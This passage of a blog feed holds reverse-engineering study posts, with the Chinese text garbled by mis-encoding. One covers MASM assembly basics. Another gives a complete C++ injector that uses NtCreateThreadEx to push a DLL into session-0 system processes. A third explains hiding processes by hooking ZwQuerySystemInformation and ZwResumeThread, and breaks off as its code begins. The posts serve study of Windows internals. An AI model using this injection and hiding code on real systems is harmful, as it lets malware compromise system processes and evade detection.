myFunc;å¯ä»¥ç›´æ¥è°ƒç”¨å®šä¹‰çš„å‡½æ•°</span><br><span class="line">_emit 1;ç«‹å³æ•°</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x64ï¼š</p><p>åœ¨ç”Ÿæˆä¾èµ–é¡¹ä¸­å‹¾é€‰masmï¼Œæ–°å»ºasmæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">Myadd proc</span><br><span class="line">mov ecx,edx</span><br><span class="line">mov eax,ecx</span><br><span class="line">ret</span><br><span class="line">Myadd endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>å†å£°æ˜head.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exten <span class="string">&quot;C&quot;</span> DWORD <span class="title function_">Myadd</span><span class="params">(DWORD a,DWORD b)</span>;</span><br></pre></td></tr></table></figure><p>åŒ…å«è¿™ä¸ªæ–‡ä»¶å³å¯ç›´æ¥ä½¿ç”¨</p><h2 id="x64åŸºæœ¬æ ¼å¼">x64åŸºæœ¬æ ¼å¼</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">sub rsp,28h</span><br><span class="line">add rsp,28h</span><br><span class="line">ret</span><br><span class="line">main endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥å†™ä»£ç ï¼Œè°ƒç”¨å‡½æ•°ç”¨fastcall</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">.data?;å®šä¹‰æœªåˆå§‹åŒ–æ•°æ®</span><br><span class="line">.const;å®šä¹‰å¸¸é‡</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¿®æ”¹ç¼–è¯‘å™¨ä¸ºinterï¼Œå¯ä»¥ç»§ç»­ä½¿ç”¨å†…è”æ±‡ç¼–</p><p>å¯ä»¥ç›´æ¥ä½¿ç”¨vsæˆ–è€…idaæŸ¥çœ‹c/cppä»£ç ç„¶åå–å¾—ç›¸åº”çš„æ±‡ç¼–ä»£ç ï¼Œé¿å…éº»çƒ¦<br>VSä¸­éœ€è¦å…ˆå–æ¶ˆç¬¦å·</p>]]></content>
    
    
    <summary type="html">MASMä¸‹çš„æ±‡ç¼–å­¦ä¹ </summary>
    
    
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="é€†å‘" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="åŸºç¡€" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="æ±‡ç¼–" scheme="https://www.pri87.vip/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>ã€Šé€†æ ¸ã€‹0C-å‘ä¼šè¯0æ³¨å…¥DLL</title>
    <link href="https://www.pri87.vip/posts/9dacfd2d.html"/>
    <id>https://www.pri87.vip/posts/9dacfd2d.html</id>
    <published>2025-02-27T07:30:04.000Z</published>
    <updated>2025-02-27T10:19:14.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä¼šè¯">ä¼šè¯</h2><p>ä¼šè¯æ˜¯ç™»å½•åçš„ç”¨æˆ·ç¯å¢ƒ</p><p>åœ¨è¿›ç¨‹ç®¡ç†å™¨ä¸­è¯¦ç»†ä¿¡æ¯çš„ç©ºæ ä¸­å³é”®ï¼Œå¯ä»¥æ‰“å¼€ä¼šè¯å±æ€§ï¼š</p><p><img src="https://s2.loli.net/2025/02/27/NUsmc2Vodyr4CLP.png" alt="image-20250227180553270"></p><p>å®ƒç”¨æ¥éš”ç¦»ä¸åŒç”¨æˆ·çš„æ“ä½œç¯å¢ƒï¼Œä¼šè¯IDçš„å…ˆåé¡ºåºå–å†³äºç³»ç»Ÿå¯åŠ¨åå“ªä¸ªç”¨æˆ·å…ˆç™»å½•ï¼Œä¼šè¯0ä¸€èˆ¬ä¸ºç³»ç»Ÿè¿›ç¨‹ï¼Œå’Œç”¨æˆ·è¿›ç¨‹éš”ç¦»æ¥æé«˜å®‰å…¨æ€§ã€‚ï¼ˆä½†æ˜¯çœ‹èµ·æ¥ä¼¼ä¹æ²¡ä»€ä¹ˆç”¨ï¼‰</p><p>å¦‚æœè¦æ³¨å…¥ç³»ç»Ÿè¿›ç¨‹ï¼Œç›´æ¥ä½¿ç”¨CreateRemoteThreadä¼šè¢«æ‹¦æˆªä¸‹æ¥ï¼Œæ‰€ä»¥éœ€è¦ç”¨å¦å¤–çš„åŠæ³•ã€‚æœ€ç®€å•çš„å°±æ˜¯æ¢ä¸€ä¸ªAPIï¼šNtCreateThreadEx</p><p>å®šä¹‰å¦‚ä¸‹ï¼Œä¸CreateRemoteThreadå·®ä¸å¤š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* PFNTCREATETHREADEX)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PHANDLE ThreadHandle,<span class="comment">//åˆ›å»ºçš„çº¿ç¨‹çš„çº¿ç¨‹å¥æŸ„</span></span></span></span><br><span class="line"><span class="params"><span class="function">ACCESS_MASK DesiredAccess,<span class="comment">//çº¿ç¨‹æƒé™</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID ObjectAttributes,<span class="comment">//å±æ€§ï¼Œä¸€èˆ¬nullptr</span></span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,<span class="comment">//ç›®æ ‡è¿›ç¨‹å¥æŸ„</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,<span class="comment">//èµ·å§‹å‡½æ•°</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,<span class="comment">//å‚æ•°</span></span></span></span><br><span class="line"><span class="params"><span class="function">ULONG CreateThreadFlags,<span class="comment">//å¥½åƒå’ŒæŒ‚èµ·æœ‰å…³ï¼Œå¡«FALSEå³å¯</span></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T ZeroBits,<span class="comment">//0å³å¯</span></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T StackSize,<span class="comment">//0å³å¯</span></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T MaximumStackSize,<span class="comment">//0å³å¯</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID pUnkown<span class="comment">//nullptrå³å¯</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨è¿™ä¸ªæ³¨å…¥å°±å¥½</p><p>æ³¨å…¥å™¨ä»£ç </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">modifiedCreateRemoteThread</span><span class="params">(HANDLE hProcess, LPTHREAD_START_ROUTINE pThreadProc, LPVOID pRemoteBuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FARPROC pNtCreateThreadEx = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtCreateThreadEx&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pNtCreateThreadEx)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NtCreateThreadEx not found&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* PFNTCREATETHREADEX)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID pUnkown</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line">PFNTCREATETHREADEX crt = <span class="built_in">reinterpret_cast</span>&lt;PFNTCREATETHREADEX&gt;(pNtCreateThreadEx);</span><br><span class="line">HANDLE hThread;</span><br><span class="line"><span class="built_in">crt</span>(&amp;hThread, THREAD_ALL_ACCESS, <span class="literal">nullptr</span>, hProcess, pThreadProc, pRemoteBuf, FALSE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create thread failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);<span class="comment">//ç­‰å¾…çº¿ç¨‹ç»“æŸ</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> status = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)))<span class="comment">//å–å¾—å¯¹åº”PIDå¥æŸ„</span></span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;open %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<span class="comment">//ç”³è¯·å†…å­˜</span></span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="number">0</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;memory alloc failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);<span class="comment">//å†™å…¥åœ°å€</span></span><br><span class="line">HMODULE kernel = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (kernel == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(kernel, <span class="string">&quot;LoadLibraryW&quot;</span>);<span class="comment">//è·å–LodaLibraryåœ°å€</span></span><br><span class="line">status = <span class="built_in">modifiedCreateRemoteThread</span>(hProcess,</span><br><span class="line">pThreadProc,<span class="comment">//çº¿ç¨‹å›è°ƒå‡½æ•°</span></span><br><span class="line">pBuf<span class="comment">//ä¼ å‚</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[]) &#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;USAGE: %s pid dll_path\n&quot;</span>), argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">inject</span>((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]))</span><br><span class="line">_tprintf(_T(<span class="string">&quot;inject %s success!\n&quot;</span>), argv[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;inject %s failed! \n&quot;</span>), argv[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/02/27/ExOAXnoB3Lyhp2d.png" alt="image-20250227181313876"></p><p>å¯ä»¥çœ‹åˆ°è¿›ç¨‹æŸ¥çœ‹å™¨ä¸­æ˜¾ç¤ºå·²ç»æ³¨å…¥æˆåŠŸ</p>]]></content>
    
    
    <summary type="html">WIN7ä»¥ä¸Šç›´æ¥createRemoteThreadä¸å¯ä»¥æ³¨å…¥ä¼šè¯0çš„è¿›ç¨‹</summary>
    
    
    
    <category term="é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†" scheme="https://www.pri87.vip/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="é€†å‘" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="æŠ€èƒ½" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/"/>
    
    <category term="DLLæ³¨å…¥" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/DLL%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>ã€Šé€†æ ¸ã€‹0B-è¿›ç¨‹éšè—</title>
    <link href="https://www.pri87.vip/posts/88758528.html"/>
    <id>https://www.pri87.vip/posts/88758528.html</id>
    <published>2025-02-24T07:09:37.000Z</published>
    <updated>2025-02-27T04:17:33.748Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åŸç†">åŸç†</h2><p>æ¯ä¸ªè¿›ç¨‹å¯ä»¥é€šè¿‡ZwQuerySystemInformation APIå‡½æ•°è·å–è¿è¡Œä¸­æ‰€æœ‰æœ‰å…³è¿›ç¨‹çš„ç»“æ„ä½“é“¾è¡¨ï¼Œ<br>é€šè¿‡Hookå…¶å®ƒæ‰€æœ‰è¿›ç¨‹çš„ZwQuerySystemInformation APIï¼Œä½¿å…¶åœ¨è¿”å›å‰å…ˆåˆ æ‰æƒ³è¦éšè—è¿›ç¨‹çš„ç»“æ„ä½“ï¼Œä»è€Œå®ç°éšè—è¿›ç¨‹</p><p>ä½†æ˜¯å¦‚æœåªæœ‰è¿™æ ·ï¼Œé‚£ä¹ˆååˆ›å»ºçš„è¿›ç¨‹ä¾ç„¶èƒ½è¯†åˆ«åˆ°ï¼Œæ‰€ä»¥é™¤äº†ç›´æ¥hook ZwQuerySystemInformation ï¼Œè¿˜è¦hookåˆ›å»ºè¿›ç¨‹çš„å‡½æ•°ï¼Œè¿™é‡Œé€‰æ‹©çš„æ˜¯ZwResumeThread apiï¼Œé€šè¿‡hookè¿™ä¸ªapiï¼Œä»»ä½•ä¸€ä¸ªè¿›ç¨‹åœ¨æ‰§è¡Œå®ƒæ—¶å…ˆæ‰§è¡Œhookæ–°è¿›ç¨‹çš„ZwQuerySystemInformation å®ç°æ–°è¿›ç¨‹ä¹Ÿè¢«hookçš„æ•ˆæœã€‚</p><h2 id="å…·ä½“æµç¨‹">å…·ä½“æµç¨‹</h2><p>å†™ä¸€ä¸ªdllï¼Œæ•ˆæœæ˜¯</p><ul><li>hookæœ¬è¿›ç¨‹çš„ZwQuerySystemInformationå‡½æ•°ï¼Œéšè—ç»“æ„ä½“</li><li>hookæœ¬è¿›ç¨‹çš„ZwResumeThreadå‡½æ•°ï¼Œæ³¨å…¥è¿™ä¸ªDLL</li></ul><p>å†™ä¸€ä¸ªå…¨è¿›ç¨‹æ³¨å…¥å™¨ï¼ŒæŠŠè¿™ä¸ªdllæ³¨å…¥æ‰€æœ‰è¿›ç¨‹</p><p>éšè—ç»“æ„ä½“çš„æ–¹å¼æ˜¯</p><p>NtQuerySystemInformationå‡½æ•°åœ¨SystemInformationClasså‚æ•°ä¸º5æ—¶ä¼šåœ¨SystemInformationè¿”å›PSYSTEM_PROCESS_INFORMATIONå‹ç»“æ„ä½“é“¾è¡¨å¤´ï¼Œæ¯ä¸ªç»“æ„ä½“éƒ½ä¿å­˜äº†ä¸€ä¸ªå½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    ULONG NumberOfThreads;</span><br><span class="line">    BYTE Reserved1[<span class="number">48</span>];</span><br><span class="line">    UNICODE_STRING ImageName;</span><br><span class="line">    KPRIORITY BasePriority;</span><br><span class="line">    HANDLE UniqueProcessId;</span><br><span class="line">    PVOID Reserved2;</span><br><span class="line">    ULONG HandleCount;</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    SIZE_T PeakVirtualSize;</span><br><span class="line">    SIZE_T VirtualSize;</span><br><span class="line">    ULONG Reserved4;</span><br><span class="line">    SIZE_T PeakWorkingSetSize;</span><br><span class="line">    SIZE_T WorkingSetSize;</span><br><span class="line">    PVOID Reserved5;</span><br><span class="line">    SIZE_T QuotaPagedPoolUsage;</span><br><span class="line">    PVOID Reserved6;</span><br><span class="line">    SIZE_T QuotaNonPagedPoolUsage;</span><br><span class="line">    SIZE_T PagefileUsage;</span><br><span class="line">    SIZE_T PeakPagefileUsage;</span><br><span class="line">    SIZE_T PrivatePageCount;</span><br><span class="line">    LARGE_INTEGER Reserved7[<span class="number">6</span>];</span><br><span class="line">&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ImageName.bufferä¸ºwchar_tç±»å‹çš„è¿›ç¨‹åï¼ŒNextEntryOffsetä¸ºå’Œä¸‹ä¸€ä¸ªç»“æ„ä½“èŠ‚ç‚¹ç›¸å·®çš„å­—èŠ‚æ•°ï¼Œé€šè¿‡è¿™ä¸ªæ¥è¿æ¥ï¼Œå¦‚æœä¸º0è¯´æ˜æ²¡æœ‰åç»§èŠ‚ç‚¹ï¼Œåªè¦é€šè¿‡è¿™ä¸ªæŠŠæƒ³è¦éšè—çš„éšè—æ‰å³å¯</p><p>ç¬¬äºŒç‚¹ï¼Œå‹¾å–ZwResumeThreadæ—¶ï¼Œåº”è¯¥å…ˆæ³¨å…¥åæ¢å¤ï¼ŒåŒæ—¶æ³¨æ„æ³¨å…¥æ—¶å¹¶ä¸æ˜¯åœ¨æ–°çº¿ç¨‹å†…éƒ¨æ³¨å…¥ï¼Œè€Œæ˜¯ä½œä¸ºçˆ¶è¿›ç¨‹è¿œç¨‹çº¿ç¨‹æ³¨å…¥</p><h2 id="å®ç°">å®ç°</h2><p>dllä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span 